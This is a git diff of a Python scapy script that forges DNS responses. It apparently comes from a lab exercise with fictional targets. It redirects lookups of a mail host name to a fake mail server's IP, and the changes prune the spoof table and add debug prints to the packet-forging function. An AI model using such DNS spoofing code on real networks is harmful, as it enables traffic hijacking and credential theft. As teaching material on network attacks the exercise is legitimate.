@@ -17,9 +17,6 @@ DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS
 REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
 SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
     b"mail.doofle.com.": FAKE_GMAIL_IP,
-    "mail.doofle.com.": FAKE_GMAIL_IP,
-    b"mail.doofle.com": FAKE_GMAIL_IP,
-    "mail.doofle.com": FAKE_GMAIL_IP
 }
 
 
@@ -164,11 +161,21 @@ class DnsHandler(object):
         transaction_id = pkt[DNS].id  # Transaction ID
         query_name = pkt[DNS].qd.qname  # Query name
 
+        # print everything we got
+        print("ip_src:", ip_src)
+        print("ip_dst:", ip_dst)
+        print("port_src:", port_src)
+        print("port_dst:", port_dst)
+        print("transaction_id:", transaction_id)
+        print("query_name:", query_name)
+        print("to:", to)
+
         response_pkt = IP(src=ip_src, dst=ip_dst) / \
                        UDP(sport=port_src, dport=port_dst) / \
                        DNS(id=transaction_id, qr=1, aa=1, qd=pkt[DNS].qd,
                            an=DNSRR(rrname=query_name, ttl=300, rdata=to))
-
+        print(response_pkt)
+        print(response_pkt.show())
         return response_pkt
 
     def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
